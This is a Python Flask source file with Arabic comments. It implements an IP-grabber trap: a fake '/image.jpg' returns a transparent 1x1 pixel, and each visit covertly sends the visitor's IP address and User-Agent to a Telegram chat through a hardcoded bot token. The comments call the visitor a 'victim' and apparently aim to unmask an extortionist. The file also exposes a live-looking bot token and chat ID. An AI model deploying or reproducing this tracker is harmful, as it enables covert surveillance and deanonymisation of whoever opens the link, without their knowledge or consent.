import os
from flask import Flask, request, send_file
import telebot
import io

# --- الإعدادات سيدي ---
TOKEN = "8444429563:AAEZL3LwcSp50Bx_CgL46g5KnXmC8NjAtxw"
CHAT_ID = "5775781038"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

def get_victim_ip():
    # سحب الـ IP من خلف بروكسي الاستضافة العالمية
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def home():
    return "Server is Running..."

@app.route('/image.jpg')
def trap():
    ip = get_victim_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # رسالة الصيد الفتاكة
    log = (
        f"🔥 **بموجب المعاينة: تم صيد المبتز!**\n\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **جهازه:** `{ua[:100]}`"
    )
    bot.send_message(CHAT_ID, log, parse_mode="Markdown")
    
    # إرسال صورة شفافة 1x1 (يمكنك تغييرها لصورة حقيقية لاحقاً)
    img = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n\x2d\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(img), mimetype='image/jpeg')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
